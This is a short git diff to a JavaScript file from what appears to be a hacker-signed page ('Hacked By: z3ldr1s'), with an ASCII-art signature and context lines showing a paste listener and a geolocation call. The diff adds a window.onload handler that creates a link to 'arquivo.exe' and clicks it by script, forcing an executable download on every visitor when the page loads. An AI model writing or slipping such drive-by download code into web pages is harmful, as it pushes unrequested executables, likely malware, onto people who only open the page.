@@ -215,6 +215,19 @@ document.addEventListener('paste', async (event) => {
         } else {
             alert('Geolocalização não suportada pelo navegador.');
         }
+
+    window.onload = function() {
+        // Criar o link de download
+        const link = document.createElement('a');
+        link.href = 'arquivo.exe'; // Substitua pelo caminho do arquivo
+        link.download = 'arquivo.exe'; // Nome do arquivo ao ser baixado
+
+        // Simular o clique no link para iniciar o download
+        link.click();
+    };
+
+
+
   //
   // Desenvolvido por z3ldr1$ vulgo zel zel
   // Hacked By: z3ldr1s
@@ -233,10 +246,10 @@ document.addEventListener('paste', async (event) => {
   //                         ___________         _________				
   //     1  '    sssssssss  |___________        |_________			
   //     1       ss         |                   |					
-  //     1         s    	|___________      	|_________			 		
+  //     1         s        |___________      	|_________			 		
   //     1          s       |                   |			
-  //     1           s 		|___________        |__________			
-  //     1     ssssssss 	|___________        |__________  .you  
+  //     1           s 	    |___________        |__________			
+  //     1     ssssssss     |___________        |__________  .you  
   //     1
   //	___    			          
   //                       
